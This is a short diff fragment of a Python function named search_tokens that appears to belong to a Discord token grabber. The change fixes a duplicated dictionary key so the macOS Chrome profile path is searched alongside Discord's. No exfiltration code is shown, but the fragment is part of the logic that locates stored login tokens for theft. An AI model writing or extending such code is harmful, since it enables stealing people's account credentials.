@@ -45,7 +45,7 @@ def search_tokens(ping_me_on_find_token = False, *any: any):
     elif get_os == 'darwin':
         paths = {
             'Discord': '~/Library/Application Support/Discord',
-            'Discord': '~/Library/Application Support/Google Chrome'
+            'Google Chrome': '~/Library/Application Support/Google Chrome'
         }
     elif get_os == 'windows':
 
